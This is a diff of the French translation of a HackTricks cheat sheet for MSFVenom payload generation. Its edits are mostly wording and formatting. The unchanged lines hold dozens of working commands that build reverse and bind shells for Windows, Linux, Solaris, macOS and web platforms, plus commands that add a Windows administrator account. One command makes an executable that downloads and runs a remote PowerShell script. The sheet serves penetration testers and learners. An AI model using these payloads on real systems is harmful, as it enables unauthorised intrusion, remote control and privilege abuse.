@@ -1,4 +1,4 @@
-# MSFVenom - Feuille de triche
+# MSFVenom - Fiche de triche
 
 <details>
 
@@ -14,7 +14,7 @@ Autres façons de soutenir HackTricks :
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
 Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates expérimentés et des chasseurs de primes !
 
@@ -22,7 +22,7 @@ Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSb
 Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
 
 **Actualités de piratage en temps réel**\
-Restez à jour avec le monde du piratage en évolution rapide grâce aux actualités et aux informations en temps réel
+Restez à jour avec le monde du piratage en constante évolution grâce aux actualités et aux informations en temps réel
 
 **Dernières annonces**\
 Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
@@ -50,6 +50,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+## **Windows**
+
 ### **Shell Inversé**
 
 {% code overflow="wrap" %}
@@ -62,12 +64,16 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
+{% endcode %}
+
 ### Créer un utilisateur
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
+{% endcode %}
+
 ### Shell CMD
 
 {% code overflow="wrap" %}
@@ -81,6 +87,8 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
+{% endcode %}
+
 ### Encodeur
 
 {% code overflow="wrap" %}
@@ -110,13 +118,15 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
+{% endcode %}
+
 ### SunOS (Solaris)
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **Payloads MAC**
+## **Charges MAC**
 
 ### **Shell Inversé:**
 
@@ -130,17 +140,19 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
+{% endcode %}
+
 ## **Charges utiles basées sur le Web**
 
 ### **PHP**
 
-#### Coquille inversée
-
-{% code overflow="wrap" %}
+#### Shell inversé
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
+{% endcode %}
+
 ### ASP/x
 
 #### Shell inversé
@@ -153,11 +165,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ### JSP
 
 #### Shell inversé
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
+{% endcode %}
+
 ### GUERRE
 
 #### Shell Inversé
@@ -172,7 +184,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Chargements de langage de script**
+## **Charges de langage de script**
 
 ### **Perl**
 
@@ -188,6 +200,8 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
+{% endcode %}
+
 ### **Bash**
 
 {% code overflow="wrap" %}
@@ -196,15 +210,15 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de bugs !
+Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de primes en bugs !
 
-**Perspectives de piratage**\
-Engagez-vous avec du contenu qui explore les sensations et les défis du piratage
+**Perspectives sur le piratage**\
+Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
 
-**Actualités de piratage en temps réel**\
-Restez à jour avec le monde du piratage en évolution rapide grâce aux actualités et aux perspectives en temps réel
+**Actualités sur le piratage en temps réel**\
+Restez à jour avec le monde du piratage en constante évolution grâce aux actualités et aux perspectives en temps réel
 
 **Dernières annonces**\
 Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
@@ -217,10 +231,10 @@ Restez informé des dernières primes de bugs lancées et des mises à jour cruc
 
 Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
